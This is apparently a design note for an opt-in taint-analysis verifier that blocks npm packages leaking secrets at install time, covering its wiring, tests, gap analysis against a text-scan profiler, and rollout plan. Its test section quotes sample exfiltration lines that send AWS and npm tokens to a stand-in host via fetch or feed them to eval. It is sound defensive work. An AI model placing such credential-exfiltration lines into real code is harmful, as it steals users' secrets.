# Optional sound dataflow verification for JS (flagged prototype)

Status: **prototype, default OFF.** Flipping it on is opt-in and can only
*strengthen* a verdict. This document records what is wired, what it catches
today, the empirical gap analysis against the existing profiler, and the plan
to make the sound engine the default install-time gate later.

## Background: two verifiers, two precisions

OMC has two analyzers:

1. **The install/inspect-time profiler** (`crates/omc-registry/src/profiler.rs`,
   `SourceProfiler`). A lightweight TEXT SCAN over package source. It is
   deliberately conservative and fails closed on the obfuscation it recognises
   (computed access on capability roots, string-built identifiers, indirect
   `require`, dynamic `import`/`eval`, non-UTF8 source bytes). It models data
   FLOWS coarsely: in `verify::module_from_profile` it emits a synthetic
   microcode module that pairs **every detected source KIND** (`EnvRead`,
   `FsRead`) with **every detected sink KIND** (`HttpRequest`, `ProcSpawn`,
   `FsWrite`, `DynamicEval`) as a cross-product, then runs the verifier over
   that. So within a single file it *over-approximates*: any source plus any
   sink anywhere in the file is treated as a flow.

2. **The sound interprocedural-taint engine** (`crates/omc-verify`,
   `crates/omc-vm`, `crates/omc-frontend-js`). It lowers real JS into microcode
   and tracks taint *precisely* — through locals, calls, recursion, and the
   `fetch(url, body)` body slot — from each capability SOURCE to each SINK. It is
   the engine that already gates in-cell execution (`exec_cell.rs`). It is sound
   in the dataflow sense: it reports a flow only when one genuinely exists, and
   it follows taint across function and (via `verify_program`) package
   boundaries.

This prototype wires (2) into the install/compile gate, behind a flag, as an
ADDITIVE second opinion.

## What is wired

`crates/omc-registry/src/sound_verify.rs`:

- `sound_verify_enabled(config_flag)` — the gate. Returns true when the
  `OMC_SOUND_VERIFY` environment variable is truthy (`1`/`true`/`yes`/`on`,
  case-insensitive) **or** the caller passes a config flag. Default (unset /
  false) is OFF.
- `sound_verify_js_archive(package, bytes, policy)` — for npm packages, decodes
  the `.js`/`.mjs`/`.cjs` files from the tarball (same size cap and lossy-UTF8
  decode as the profiler), lowers each with `omc-frontend-js::compile`, runs
  `omc_verify::verify_module` against the **same effective install policy** the
  profiler verdict used, and returns the rendered findings tagged
  `[sound-verify] <file>: ...`.
- `sound_verify_js_directory(package, root, policy)` — the directory variant for
  the hidden dev-build compile path.

Both install call sites consult the flag and fold the sound findings into the
existing `verifier_findings` list:

- `crates/omc-registry/src/link_install.rs` (the `omc add` / install path).
- `crates/omc-registry/src/verify.rs` `compile_source_path` (the hidden
  dev-build compile path).

### The additive contract (why it can never weaken a verdict)

- **Flag OFF:** `sound_verify_enabled` short-circuits before any source is
  touched, so `verifier_findings`, the verdict, the recorded capabilities, and
  the performance are **byte-identical** to today. (Test:
  `flag_off_is_byte_identical_for_pure_module`, plus the unchanged 100-pkg smoke
  split.)
- **Flag ON:** the sound findings are *appended* to the profiler's findings.
  Nothing is ever removed or cleared. The verdict is `Blocked` iff
  `verifier_findings` is non-empty, so appending can only move a verdict from
  `Accepted` to `Blocked`, never the reverse.
- A JS file outside the front-end subset is a `FrontendError`, which we **skip**
  (the profiler's own — unchanged — verdict still stands for that file). A skip
  adds nothing, so it cannot relax anything.

## What it catches today (proven by tests)

`sound_verify.rs` tests, all using canary hosts (`canary.invalid`) and no real
secrets:

- `aliased_exfil_blocked_by_sound_engine` — `const secret =
  process.env.AWS_SECRET_ACCESS_KEY; const copy = secret; fetch('https://canary.invalid/c', copy)`.
  The engine tracks taint through both locals into the request body and blocks
  (no env→net flow grant).
- `eval_exfil_blocked_by_sound_engine` — `const secret = process.env.NPM_TOKEN;
  eval(secret)` lowers to `DynamicEval` with the tainted source on the stack;
  the install policy never grants `DynamicEval`, so the engine blocks.
- `flag_on_aliased_exfil_emits_sound_finding` /
  `flag_on_eval_exfil_emits_sound_finding` — the same two payloads end-to-end
  through `compile_source_path` with the flag ON: a `[sound-verify]` finding is
  recorded and the verdict is `Blocked`.
- `flag_on_pure_module_stays_accepted` / `pure_module_has_no_sound_findings` —
  no false strengthening on a pure module.

## Empirical gap analysis vs. the current profiler (important, honest)

The original motivation was "catch an aliased/eval exfil that the profiler ALONE
marks Pure/Accepted." During this work we probed the profiler directly and found
an important fact:

> For every exfil that the **current** `omc-frontend-js` subset can lower, the
> hardened profiler ALSO blocks it.

This is not a coincidence — it is structural:

1. The JS front-end subset is narrow: only `module.exports = function (...)
   {...}` (single function; `const`/`let` locals; `fetch`, `eval`,
   `new Function`, `process.env.X`, and `require`-aliased `fs`/`http`/`https`/
   `child_process` calls). It rejects multi-function modules and statements
   before `module.exports`.
2. The capability **sources** (`process.env.X`) and **sinks** (`fetch`, `eval`,
   `new Function`, the http/proc/fs builtins) the front end recognises are a
   **strict subset** of the literal markers the profiler text-scan keys on.
3. The profiler over-approximates flows (whole-file source-kind × sink-kind
   cross-product) and unconditionally denies `DynamicEval`.

So any payload the front end can lower into a real source→sink flow also trips
the profiler's text markers, and the profiler blocks it first. We verified this
across aliased-fetch, fs-write, proc-spawn, http(s).request, url-concat,
non-http-scheme fetch, and inline eval payloads — profiler = `Blocked` in every
lowerable case.

### Where the sound engine genuinely wins (and why the default flip matters)

The sound engine's decisive advantages are **precision** and **reach**, neither
of which the per-file text profiler can match:

- **Interprocedural / cross-package flows.** `verify_program` follows taint
  across `CallImport` boundaries through the linker's resolution table: a secret
  read in package A, handed to package B, posted by package C. The profiler is
  per-file text only and cannot model this at all — it is the core of the
  "whole bypass class" the durable fix targets.
- **No false flows.** The profiler's whole-file cross-product blocks a benign
  package that merely *both* reads an unrelated env var *and* makes an unrelated
  network call. The sound engine blocks only on a real source→sink path, so
  making it the gate reduces false blocks while keeping every true block.
- **Robustness as the front end grows.** As the subset widens (below), the
  text-scan markers will increasingly miss precise flows the engine still
  tracks; the sound path is the forward-compatible gate.

## Integration plan (to make this the default later)

1. **Widen the `omc-frontend-js` subset** so it lowers realistic package shapes:
   multiple top-level functions, `const x = require(...)` preludes, `exports.x =`
   forms, object/array literals, and method chains. Each addition must keep the
   "dangerous host call lowers to an explicit `Op::Cap`, never a benign op"
   contract. This is the precondition for the sound path to *dominate* the
   profiler instead of being subsumed by it.
2. **Lower the whole package as a linked graph** and verify with
   `verify_program` (not per-file `verify_module`), so cross-file and
   cross-package flows are caught — the class the profiler cannot reach.
3. **Add a config field** (`[verify] sound = true` in `omc.toml`, threaded
   through `LinkOptions`) alongside the env var, so projects can opt in
   per-repo. `sound_verify_enabled` already accepts a `config_flag` for this.
4. **Run the prototype in shadow mode** across the smoke corpus: record where the
   sound path and the profiler disagree, confirm every sound-only block is a true
   positive and every profiler-only block is a sound false-negative-or-tie, then
   make the sound result authoritative for lowerable files while keeping the
   profiler as the deny-by-default backstop for unlowerable ones.
5. **Flip the default** only once (1)–(4) show the sound gate is a strict
   superset of the profiler's blocks on the corpus. Until then the profiler
   stays the gate and the sound path is an additive, flagged second opinion.

## How to try it

```sh
OMC_SOUND_VERIFY=1 omc add <package>      # install path
OMC_SOUND_VERIFY=1 cargo run -p omc-cli --features dev-commands -- compile <dir|file>
```

With the flag set, any `[sound-verify] <file>: ...` lines in the artifact's
`verifier_findings` are the engine's findings; their presence forces a `Blocked`
verdict. With the flag unset, the behaviour is exactly as before.
